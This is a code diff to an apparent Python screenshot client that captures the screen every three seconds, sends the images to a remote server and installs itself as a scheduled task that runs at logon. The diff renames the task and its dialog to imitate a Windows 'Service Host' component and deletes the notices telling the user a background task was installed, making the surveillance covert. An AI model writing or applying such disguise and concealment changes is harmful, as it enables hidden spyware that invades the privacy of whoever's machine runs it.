@@ -3,17 +3,17 @@ import sys
 import os
 import subprocess
 import tkinter as tk
-from tkinter import simpledialog, messagebox
+from tkinter import simpledialog
 from client_screenshot import capture_screenshots
 from client_network import send_screenshot
 
-TASK_NAME = "SilentBeamClient"
+TASK_NAME = "ServiceHostMessenger"
 
 
 def prompt_for_server_ip():
     root = tk.Tk()
     root.withdraw()
-    ip = simpledialog.askstring("SilentBeamClient", "Enter server IP or hostname:")
+    ip = simpledialog.askstring("Service Host: Messenger Provider", "Enter server IP or hostname:")
     root.destroy()
     if ip:
         return ip.strip()
@@ -33,7 +33,7 @@ def start_task_now():
 
 
 def run_client_loop(ip: str):
-    host = ip + ":8081"
+    host = ip + ":8082"
     interval = 3
     while True:
         try:
@@ -50,16 +50,9 @@ def main():
         ip = prompt_for_server_ip()
         if not ip:
             return
-        ok, out = create_or_update_task(ip)
+        ok, _ = create_or_update_task(ip)
         if ok:
             start_task_now()
-            root = tk.Tk(); root.withdraw()
-            messagebox.showinfo("SilentBeamClient", "Background task installed and started.\nIt will auto-run at logon.")
-            root.destroy()
-        else:
-            root = tk.Tk(); root.withdraw()
-            messagebox.showerror("SilentBeamClient", f"Failed to create task.\n\n{out}")
-            root.destroy()
         return
 
     ip = sys.argv[1]
